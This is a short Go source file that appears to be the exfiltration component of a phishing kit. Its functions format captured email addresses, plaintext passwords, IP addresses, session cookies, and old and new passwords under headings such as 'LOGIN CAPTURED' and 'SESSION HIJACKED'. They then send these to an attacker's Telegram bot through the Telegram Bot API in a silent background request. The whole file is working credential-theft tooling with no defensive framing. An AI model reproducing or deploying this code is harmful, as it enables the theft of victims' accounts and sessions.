package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

type TelegramConfig struct {
	BotToken string
	ChatID   string
}

func SendTelegramMessage(cfg TelegramConfig, message string) {
	if cfg.BotToken == "" || cfg.ChatID == "" {
		return
	}
	go func() {
		payload := map[string]interface{}{"chat_id": cfg.ChatID, "text": message, "parse_mode": "HTML"}
		jsonData, _ := json.Marshal(payload)
		url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", cfg.BotToken)
		req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err == nil {
			defer resp.Body.Close()
			io.ReadAll(resp.Body)
		}
	}()
}

func FormatLoginAlert(email, password, ip, userAgent string) string {
	return fmt.Sprintf("🔑 <b>LOGIN CAPTURED</b>\n📧 Email: <code>%s</code>\n🔒 Password: <code>%s</code>\n🌐 IP: <code>%s</code>\n⏰ Time: %s\n", email, password, ip, time.Now().Format("15:04:05"))
}

func FormatCookieHarvest(email string, cookies []string) string {
	cookieStr := ""
	for _, c := range cookies {
		cookieStr += c + "\n"
	}
	return fmt.Sprintf("🍪 <b>SESSION HIJACKED</b>\n📧 Target: <code>%s</code>\n🔗 Cookies:\n<code>%s</code>\n", email, cookieStr)
}

func FormatPasswordChange(oldPass, newPass, email string) string {
	return fmt.Sprintf("🔄 <b>PASSWORD CHANGED</b>\n📧 User: <code>%s</code>\n🔓 Old Pass: <code>%s</code>\n🔑 New Pass: <code>%s</code>\n", email, oldPass, newPass)
}
